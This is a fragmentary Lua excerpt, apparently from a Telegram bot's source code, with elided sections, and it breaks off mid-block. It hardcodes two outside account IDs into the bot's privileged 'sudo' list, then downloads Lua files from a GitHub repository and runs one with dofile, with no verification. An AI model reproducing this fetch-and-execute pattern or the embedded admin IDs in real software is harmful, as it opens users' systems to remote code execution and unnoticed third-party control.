...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,633004612,1765160742}
print([[
...
download_to_file('https://raw.githubusercontent.com/jokerrrrrrrrrr7/TshAkEx/main/Tshake.lua', 'Tshake.lua') 
download_to_file('https://raw.githubusercontent.com/jokerrrrrrrrrr7/TshAkEx/main/start.lua', 'start.lua') 
dofile('Tshake.lua')  
return false
end
...
if DevTshake(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/jokerrrrrrrrrr7/TshAkEx/main/getfile.json")
if res == 200 then
